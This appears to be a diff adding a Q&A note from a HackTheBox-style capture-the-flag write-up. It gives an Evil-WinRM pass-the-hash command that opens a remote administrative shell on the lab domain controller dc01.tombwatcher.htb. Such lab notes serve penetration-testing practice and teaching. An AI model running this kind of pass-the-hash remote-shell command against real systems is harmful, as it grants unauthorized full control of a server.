@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you establish a command shell once authenticated as the Administrator?
+
+CONTEXT:
+You have authenticated successfully using the Administrator hash.
+
+METHOD / ANSWER:
+Command: `evil-winrm -i dc01.tombwatcher.htb -u administrator -H <hash>`
+Explanation: This command uses Evil-WinRM to initiate a remote shell session with the Administrator account, providing you with full administrative access to the server.
